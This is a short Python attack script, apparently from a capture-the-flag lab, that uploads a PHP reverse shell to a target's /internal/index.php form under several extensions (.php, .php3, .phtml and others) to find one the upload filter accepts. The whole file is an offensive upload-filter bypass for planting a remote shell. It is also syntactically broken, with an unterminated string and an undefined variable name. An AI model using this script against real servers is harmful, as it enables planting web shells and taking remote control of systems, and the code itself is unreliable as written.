#!/usr/bin/env python

import requests, os

ip = "10.10.83.93"
url = f"http://{ip}:3333/internal/index.php" 		#login page

old_file = "/home/php-reverse-shell.php" 

							# requests to upload a file
file = "/home/php-reverse-shell
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml",
]

							#from source URL page, form action = index.php, method = post, enctype = multipart/form-data

for ext in extensions:

	new_file = file + ext 				# forms which extension of the reverse shell works
	os.rename(old_file, new_file)			#renames the file after testing

	files = {"file": open(new_filename, "rb")}	#python requests to upload a file
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} is allowed")	

	old_file = new_file				#resets the file name after resetting from os.rename
